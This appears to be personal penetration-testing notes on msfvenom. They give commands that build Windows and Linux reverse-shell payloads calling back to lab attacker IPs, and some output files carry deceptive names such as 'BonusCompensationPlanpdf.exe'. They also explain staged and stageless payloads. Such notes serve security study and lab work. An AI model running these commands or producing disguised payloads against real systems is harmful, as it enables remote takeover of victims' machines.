## msfvenom
msf venom helps to craft payloads and reverse shells etc
Creates reverse shells for different platforms

### Example
```shell
msfvenom -l payloads # list all payloads
```
```shell
#on attacker we need of course a listener if we want to catch the created shells

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f asp > shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe > shell.exe
msfvenom -p linux/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f php > shell.php
msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.10.14.190 LPORT=8001 -f sh > shell.sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
#### Build Simple stageless payload
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
msfvenom #Defines the tool used to make the payload.
-p #This option indicates that msfvenom is creating a payload.
linux/x64/shell_reverse_tcp # Specifies a Linux 64-bit stageless payload that will initiate a TCP-based reverse shell (shell_reverse_tcp).
LHOST=10.10.14.113 LPORT=443 # When executed, the payload will call back to the specified IP address (10.10.14.113) on the specified port (443).
-f elf # The -f flag specifies the format the generated binary will be in. In this case, it will be an .elf file.
> createbackup.elf # Output

```

## Stageless vs Staged Payload
- Staged Payload will create a stage on the target system that can connect back to the attacker to get the next stage of the payload.
- Stageless Payload will create a single payload that will execute on the target system without needing to connect back to the attacker for additional stages.

#### Nameing vonvention in msvenom and metasploit
```
Staged: linux/x86/shell/reverse_tcp
Stageless: linux/zarch/meterpreter_reverse_tcp

Staged:  windows/meterpreter/reverse_tcp 
Stageless: windows/meterpreter_reverse_tcp
 
```

